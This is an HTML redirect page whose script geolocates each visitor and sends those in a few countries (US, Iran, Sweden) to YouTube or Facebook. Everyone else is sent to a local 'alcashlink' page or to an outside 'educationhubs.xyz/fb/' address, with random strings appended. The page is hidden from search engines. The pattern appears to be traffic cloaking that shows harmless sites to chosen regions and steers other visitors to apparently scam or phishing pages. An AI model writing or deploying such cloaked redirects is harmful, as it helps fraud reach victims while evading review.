<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>

    <script>
        // 1. Random String Function (Cache Busting)
        function generateRandomStr(length) {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        async function handleRedirection() {
            const randomID = generateRandomStr(7);
            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
            
            // 2. Check if Mobile
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

            try {
                // 3. Get Country Info (Modern Fetch API)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const country = data.country_code; // Example: "US", "IN", "PK"

                // 4. Custom Redirection Logic
                const countryLinks = {
                    "IR": "https://www.youtube.com/",
                    "US": "https://www.youtube.com/",
                    "SE": "https://www.facebook.com/"
                };

                // Agar country match hoti hai toh pehle wo check karega
                if (countryLinks[country]) {
                    window.location.href = countryLinks[country] + "?" + randomID;
                } 
                // Agar country match nahi hui, toh Device ke hisaab se redirect karega
                else if (isMobile) {
                    window.location.href = "./alcashlink.html?" + randomID;
                } 
                else {
                    window.location.href = "https://educationhubs.xyz/fb/?" + randomID;
                }

            } catch (error) {
                // Agar API fail ho jaye toh default mobile/desktop redirect
                console.error("Error fetching location", error);
                if (isMobile) {
                    window.location.href = "./alcashlink.html?" + randomID;
                } else {
                    window.location.href = "https://educationhubs.xyz/fb/?" + randomID;
                }
            }
        }

        // Run on load
        window.onload = handleRedirection;
    </script>
</head>
<body>
    <p style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        Redirecting, please wait...
    </p>
</body>
</html>
